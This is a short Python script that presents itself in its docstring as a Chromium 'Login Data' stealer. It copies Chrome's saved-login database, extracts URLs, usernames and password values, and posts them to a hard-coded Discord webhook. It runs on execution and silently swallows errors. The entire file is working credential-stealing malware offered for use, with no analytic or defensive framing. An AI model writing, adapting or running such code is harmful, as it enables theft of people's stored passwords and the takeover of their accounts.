"""Chromium Login Data stealer that posts credentials to a Discord webhook."""
import os
import shutil
import sqlite3

import requests

WEBHOOK = "https://discord.com/api/webhooks/1234567890123456789/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345"


def steal_chromium_logins() -> str:
    src = os.path.join(
        os.environ["LOCALAPPDATA"],
        "Google",
        "Chrome",
        "User Data",
        "Default",
        "Login Data",
    )
    tmp = os.path.join(os.environ["TEMP"], "login_data_copy.db")
    shutil.copy2(src, tmp)
    con = sqlite3.connect(tmp)
    cur = con.cursor()
    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
    rows = cur.fetchall()
    con.close()
    os.remove(tmp)
    return "\n".join(
        f"{origin} {username_value} {password_value}"
        for origin, username_value, password_value in rows
    )


def main() -> None:
    payload = steal_chromium_logins()
    try:
        requests.post(WEBHOOK, json={"content": payload[:1800]}, timeout=10)
    except Exception:
        pass


try:
    main()
except Exception:
    pass
